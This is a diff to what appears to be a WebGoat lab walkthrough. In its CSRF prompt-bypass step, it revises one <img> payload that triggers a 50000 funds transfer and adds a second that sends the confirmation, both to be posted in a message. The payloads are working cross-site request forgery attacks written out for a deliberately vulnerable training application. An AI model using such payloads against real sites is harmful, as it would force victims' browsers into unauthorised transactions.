@@ -140,5 +140,6 @@ Start OWASP Proxy and open a browser (I am using firefox) that is preconfigured 
    A.  Insert any text in the Title and Enter "<img src=http://XXX.XXX.XXX.XXX:8080/WebGoat/attack?Screen={insert the screen value}&menu={Insert menu value}&transferFunds=50000>"
        in the search bar" in the message.
    7.5 CSRF Prompt By-Pass
-   A.  Insert any text in the Title and Enter "<img src=http://XXX.XXX.XXX.XXX:8080/WebGoat/attack?Screen={insert the screen value}&menu={Insert menu value}&transferFunds=50000>"
+   A.  Insert any text in the Title and Enter "<img src=http://XXX.XXX.XXX.XXX:8080/WebGoat/attack?Screen={insert the screen value}&menu={Insert menu value}&transferFunds=50000/>"
+       and "<img src=http://XXX.XXX.XXX.XXX:8080/WebGoat/attack?Screen={insert the screen value}&menu={Insert menu value}&transferFunds=CONFIRM/>"
        in the search bar" in the message.
